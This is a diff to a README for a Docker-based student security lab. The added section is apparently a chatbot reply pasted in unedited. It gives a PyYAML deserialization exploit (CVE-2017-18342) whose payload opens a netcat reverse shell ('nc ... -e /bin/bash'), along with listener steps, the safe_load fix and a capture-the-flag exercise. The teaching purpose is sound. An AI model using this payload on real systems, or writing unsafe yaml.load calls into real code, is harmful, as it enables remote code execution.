@@ -3,6 +3,84 @@
 A Docker-based security visibility lab where students run intentionally misconfigured MySQL containers that report their status to an instructor-run dashboard.
 
 ---
+Absolutely — here's a clean, educational Python snippet you can share with your students that **demonstrates the core vulnerability (CVE-2017-18342)** and **how an attacker could exploit it**. It's short, clear, and safe to run in the controlled lab environment you've built.
+
+---
+
+### 🧠 **Educational Exploit Demo – PyYAML RCE Example**
+
+```python
+import yaml
+
+# 🚨 Malicious YAML payload that exploits yaml.load()
+malicious_payload = """
+!!python/object/apply:os.system
+args: ["nc host.docker.internal 4444 -e /bin/bash"]
+"""
+
+# ⚠️ This line is vulnerable — executes arbitrary code
+yaml.load(malicious_payload, Loader=yaml.UnsafeLoader)
+
+print("Payload sent. Check your listener for a shell!")
+```
+
+---
+
+### 🧑‍🏫 What to Teach From This
+
+- **PyYAML’s `load()`** function can deserialize YAML that *instantiates real Python objects*.
+- If the input is **untrusted** (like from a web form or upload), this leads to **remote code execution**.
+- Using tags like `!!python/object/apply:os.system`, an attacker can run **any shell command**.
+- In this case, it launches a **reverse shell** using `netcat`.
+
+---
+
+### 🛡️ The Fix
+
+Just one change makes this safe:
+
+```python
+yaml.safe_load(malicious_payload)
+```
+
+This will raise an error and **prevent the code from running**, because `safe_load()` only allows basic YAML types (lists, strings, dicts).
+
+---
+
+### 🧪 Suggested Workflow for Students
+
+1. **Run a listener** on their host machine:
+
+   ```bash
+   nc -lvnp 4444
+   ```
+
+2. **Run this Python script** in the vulnerable container.
+
+3. **Catch the shell** and explore the container.
+
+---
+
+### 🏁 Bonus Challenge Idea
+
+Tell students:
+> There's a `flag.txt` hidden somewhere. Exploit the app and retrieve it.
+
+Then drop this in your Dockerfile:
+
+```Dockerfile
+RUN echo "CTF{well-done-you-rce-d-the-box}" > /flag.txt
+```
+
+They’ll need to:
+- Exploit the YAML deserialization
+- Gain a shell
+- Find and `cat /flag.txt`
+
+---
+
+Let me know if you want this wrapped up into a `student_exploit_demo.py` file in the container too! 👨‍🎓📁
+---
 
 ## 🚀 Quick Start for Students
 
